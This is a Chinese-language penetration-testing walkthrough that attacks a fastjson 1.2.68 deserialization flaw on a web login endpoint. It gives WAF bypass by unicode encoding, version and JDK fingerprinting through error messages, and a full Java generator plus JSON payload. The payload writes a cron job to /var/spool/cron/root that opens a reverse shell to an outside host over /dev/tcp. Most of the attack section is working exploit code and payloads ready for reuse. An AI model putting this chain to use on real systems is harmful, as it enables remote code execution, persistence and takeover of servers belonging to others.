在登录处抓包，发现为json格式传入参数：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693192153552-521f193f-9d9a-4db4-ba41-660711b12100.png#averageHue=%23fbfbfb&clientId=u86b445f7-787a-4&from=paste&height=124&id=u83cd0353&originHeight=155&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10325&status=done&style=none&taskId=u4204412d-4bff-4584-95b9-cbfee3948d4&title=&width=457.6)
删个末尾的}(也可以加个"),看报错，很标准的fastjson错误提示，确定后端使用的fastjson
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693193197646-62ce7b5b-6bd1-4a24-945f-29c92db88de9.png#averageHue=%23fbfbfb&clientId=u86b445f7-787a-4&from=paste&height=199&id=ucbb98b32&originHeight=249&originWidth=1208&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41602&status=done&style=none&taskId=ud6dd13f4-31a4-40c8-90d4-bf6eeaa2d07&title=&width=966.4)
dnslog测试是否存在漏洞：
```json
{
  "@type":"java.net.Inet4Address",
  "val":"zqs9do.dnslog.cn"
}
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693202239832-b2ab63d5-53b6-4c65-80a7-2f2ca0a24c94.png#averageHue=%23fcfbfb&clientId=uc6d7ad91-e62c-4&from=paste&height=149&id=u6413586c&originHeight=186&originWidth=1082&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29277&status=done&style=none&taskId=u6752c7a0-3e14-4fba-a22e-1ae9af02020&title=&width=865.6)
有waf,依然使用unicode编码绕过
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693202702343-27f86e61-6961-4751-a484-16f60521e166.png#averageHue=%23f9f8f8&clientId=uc6d7ad91-e62c-4&from=paste&height=268&id=u38bd37b4&originHeight=335&originWidth=1102&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69379&status=done&style=none&taskId=u143fecbd-ed44-4306-9318-ddec51ac432&title=&width=881.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696399593289-13b421da-5502-482f-b20c-17b1fe3e7714.png#averageHue=%23a09379&clientId=u4d4c1774-f025-4&from=paste&height=215&id=u98f9c855&originHeight=269&originWidth=1195&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57987&status=done&style=none&taskId=u95161c4f-748f-41eb-bb45-316de5cabc1&title=&width=956)
探测fastjson精确版本：
```json
{
  "\u0040\u0074\u0079\u0070\u0065": "java.lang.AutoCloseable"
```
通过报错，发现版本为1.2.68，在这个大版本下极大的限制 了jndi的利用，因此比较常见的利用方式为文件读写。文件写操作能够造成的危害同样很大，比如写入计划任务、写入ssh密钥、class文件类加载或jar包等。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693205802217-aa62bbca-ba3c-4b88-a439-8f1688cf45e1.png#averageHue=%23fdfdfd&clientId=u6ef5e71e-f1f2-4&from=paste&height=198&id=u52b5559a&originHeight=247&originWidth=1249&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35374&status=done&style=none&taskId=uf8e77f86-fdfd-4b58-a9b1-b55fabbd897&title=&width=999.2)
环境依赖探测：
在1.2.68中文件写操作不只是单纯依靠fastjson，还需利用其他依赖，比较常见的是commons-io等。但是还有一种情况是在JDK11下，是不需要引入其他依赖即可造成文件写入。所以可优先探测该机器所使用的Java版本是否为JDK11。(依赖类探测主要为了解决Fastjson高版本下需依赖其他环境组合攻击，可结合我们已知Poc针对性的探测！)
利用charactor类型转换报错，当存在指定的类时会报转换错误，不存在则无显示，具体参考首页FastJson全版本利用Poc那篇文章。
`java.net.http.HttpClient`本身是JDK11下才特有的类，用于探测环境是否为JDK11
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693207937357-27f5f756-eb23-40f7-9098-c972b0016824.png#averageHue=%23fefefe&clientId=u6ef5e71e-f1f2-4&from=paste&height=176&id=u72739f57&originHeight=220&originWidth=1236&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36417&status=done&style=none&taskId=ue2d68d6c-82ca-4c89-be87-b08962da9c6&title=&width=988.8)
`can not cast to char`代表存在该类，即环境为JDK11，比如这样
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696400166956-b3a7ed0b-c203-44ba-b378-8458592425d1.png#averageHue=%23fefefd&clientId=u4d4c1774-f025-4&from=paste&height=213&id=u5377bf72&originHeight=266&originWidth=1416&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40418&status=done&style=none&taskId=ub457f7f9-8eb7-46d6-933b-b3e99c2769f&title=&width=1132.8)
`org.springframework.web.bind.annotation.RequestMapping`是SpringBoot特有的类，所以该环境为SpringBoot。
如果类不存在则无回显：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693208011055-a900abde-82fe-4c3c-b454-86679d3f7e4c.png#averageHue=%23fdfdfd&clientId=u6ef5e71e-f1f2-4&from=paste&height=171&id=u2e004965&originHeight=214&originWidth=1133&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34305&status=done&style=none&taskId=u5b19627c-faea-4b9e-82d5-0cb692d9f73&title=&width=906.4)
确定了使用的JDK11，便可无限制写入文件。这里采用写入计划任务反弹shell。
JDK11-Writefile.java:
```java
public static void main(String[] args) throws Exception {
    	String code = gzcompress("* * * * *  bash -i >& /dev/tcp/10.30.0.84/9999 0>&1 \n");
    	//<=1.2.68 and JDK11
        String payload = "{\r\n"
        		+ "    \"@type\":\"java.lang.AutoCloseable\",\r\n"
        		+ "    \"@type\":\"sun.rmi.server.MarshalOutputStream\",\r\n"
        		+ "    \"out\":\r\n"
        		+ "    {\r\n"
        		+ "        \"@type\":\"java.util.zip.InflaterOutputStream\",\r\n"
        		+ "        \"out\":\r\n"
        		+ "        {\r\n"
        		+ "           \"@type\":\"java.io.FileOutputStream\",\r\n"
        		+ "           \"file\":\"/var/spool/cron/root\",\r\n"
        		+ "           \"append\":false\r\n"
        		+ "        },\r\n"
        		+ "        \"infl\":\r\n"
        		+ "        {\r\n"
        		+ "            \"input\":\r\n"
        		+ "            {\r\n"
        		+ "                \"array\":\""+code+"\",\r\n"
        		+ "                \"limit\":1999\r\n"
        		+ "            }\r\n"
        		+ "        },\r\n"
        		+ "        \"bufLen\":1048576\r\n"
        		+ "    },\r\n"
        		+ "    \"protocolVersion\":1\r\n"
        		+ "}\r\n"
        		+ "";
        
        System.out.println(payload);
        JSON.parseObject(payload);
    }
    public static String gzcompress(String code) {
    	byte[] data = code.getBytes();
        byte[] output = new byte[0];
        Deflater compresser = new Deflater();
        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        System.out.println(Arrays.toString(output));
        return Base64.getEncoder().encodeToString(output);
    }
```
运行即可生成exp
在写入计划任务时，有几个需要注意的点：

- linux本身系统限制，首先centos和ubuntu系列是不同的，写入文件位置、命令方式均有区别，这里因为是centos系统，所以写入到`/var/spool/cron/root`文件下，而ubuntu系统则应该写入到`/etc/crontab`系统级计划任务下，而不是`/var/spool/cron/crontabs/root`文件下，因为该方式将会涉及到改权限、计划任务服务重启的操作。
- 通过这种文件写入漏洞写入计划任务时，需要在命令的后面加上换行操作，保证该命令为完整的一行，否则不会反弹成功。

写入反弹shell计划任务到`/var/spool/cron/root`中，将会生成Json格式的payload
```json

{
    "\u0040\u0074\u0079\u0070\u0065":"java.lang.AutoCloseable",
    "\u0040\u0074\u0079\u0070\u0065":"sun.rmi.server.MarshalOutputStream",
    "out":
    {
        "\u0040\u0074\u0079\u0070\u0065":"java.util.zip.InflaterOutputStream",
        "out":
        {
           "\u0040\u0074\u0079\u0070\u0065":"java.io.FileOutputStream",
           "file":"/var/spool/cron/root",
           "append":false
        },
        "infl":
        {
            "input":
            {
                "array":"eJzTUtCCQoWkxOIMBd1MBTs1Bf2U1DL9kuQCfUMDPWMDPQM9CxN9SyBQMLBTM1TgAgBAXQuq",
                "limit":1999
            }
        },
        "bufLen":1048576
    },
    "protocolVersion":1
}
```
光这样还不行，因为后面一步需要在limit处写入文件内真实数据的长度，而这个长度会因为一些处理导致并不是我们写入计划任务命令的长度，这里方法同样是利用到报错，先将limit值尽量设置较大，fastjson会因为偏移位置不对爆出正确的数据偏移，即这里的54，所以54才是真实的数据长度。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693210817825-e638cb42-0d1f-4f6f-9346-85bdd7cfd1b2.png#averageHue=%23fdfcfc&clientId=u6ef5e71e-f1f2-4&from=paste&height=171&id=u97e0a20c&originHeight=214&originWidth=1124&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33085&status=done&style=none&taskId=ude4e6c63-fb19-4057-8ceb-311d61d463e&title=&width=899.2)
这便是写入成功了。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693211158791-fcde713b-7371-417c-b917-733febbba852.png#averageHue=%23fefefe&clientId=u6ef5e71e-f1f2-4&from=paste&height=171&id=u99d95ddc&originHeight=214&originWidth=1121&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31210&status=done&style=none&taskId=ucde5e06d-402e-4ee5-8ddb-94e20fd17c6&title=&width=896.8)
大概等待一分钟即可反弹shell：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693211211936-14728b5c-971b-4bae-881a-8dd0464a79f4.png#averageHue=%23423c47&clientId=u6ef5e71e-f1f2-4&from=paste&height=202&id=ud8e754d2&originHeight=252&originWidth=929&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=563328&status=done&style=none&taskId=u5e59b430-8cad-4735-a5b2-4980bc2455c&title=&width=743.2)

